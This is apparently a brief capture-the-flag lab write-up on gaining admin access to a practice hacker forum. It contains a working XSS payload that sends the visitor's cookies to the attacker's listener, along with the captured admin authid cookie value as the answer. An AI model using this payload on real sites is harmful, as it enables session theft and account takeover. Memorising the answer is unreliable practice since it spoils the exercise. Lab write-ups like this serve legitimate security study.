# ELF JS

```
Gaining admin access to hacker forum
IP:3000
XSS to steal cookie maybe
```

## Notes

```
export IP=10.10.47.211

```

## Questions

1. What is the admin's authid cookie value?

```
<script>document.location="ncip?" + document.cookie</script>

will need to wait some time to get admin cookie

2564799a4e6689972f6d9e1c7b406f87065cbf65
```
